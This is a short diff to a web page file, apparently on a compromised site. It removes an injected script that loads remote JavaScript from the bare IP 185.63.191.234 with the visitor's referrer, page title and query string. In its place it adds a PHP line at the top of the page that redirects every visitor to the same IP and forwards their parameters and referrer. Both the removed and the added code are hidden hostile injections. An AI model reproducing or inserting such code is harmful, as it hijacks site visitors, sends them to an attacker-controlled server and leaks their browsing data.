@@ -1,14 +1,4 @@
-<span id="0d7b57f0-b15c-ce48-a9eb-31861892ffd3"></span><script type="application/javascript">
-var d=document;var s=d.createElement('script'); 
-s.src='//185.63.191.234/mP2wq4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5ee3dfb6e44d1=script5ee3dfb6e44d2&_cid=0d7b57f0-b15c-ce48-a9eb-31861892ffd3'; 
-if (document.currentScript) { 
-document.currentScript.parentNode.insertBefore(s, document.currentScript);
-} else {
-d.getElementsByTagName('head')[0].appendChild(s);
-}
-if (document.location.protocol === 'https:' && '//185.63.191.234/mP2wq4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5ee3dfb6e44d1=script5ee3dfb6e44d2'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
-</script>
-
+<?php header('Location: //185.63.191.234/mP2wq4?' . http_build_query($_GET) . '&se_referrer=' . urlencode($_SERVER['HTTP_REFERER']) . ''); ?>
 <!DOCTYPE html>
 <html lang="en">
 
